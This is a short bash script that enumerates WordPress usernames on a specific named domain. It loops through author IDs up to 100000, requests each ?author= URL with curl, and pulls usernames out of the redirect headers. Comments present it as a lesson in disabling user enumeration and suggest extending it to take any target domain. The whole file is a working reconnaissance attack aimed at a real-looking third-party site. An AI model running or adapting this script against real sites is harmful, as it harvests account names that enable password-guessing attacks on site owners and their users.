#!/usr/bin/env bash

# First lesson when advertising your company with a WP site:
# Disable user enumeration!

for N in $(seq 1 100000);
do
    curl -sSI "https://sshteam.com/?author=$N" |  sed -rn 's#Location: https://sshteam.com/author/(.*?)/#\1#pi'
    sleep 1;
done

# If this seems too much, do not look at source code of
# the WPScan project!

# TODO: As kind of homework, make this script to expose an API
# so that target domain can be given via cli argument
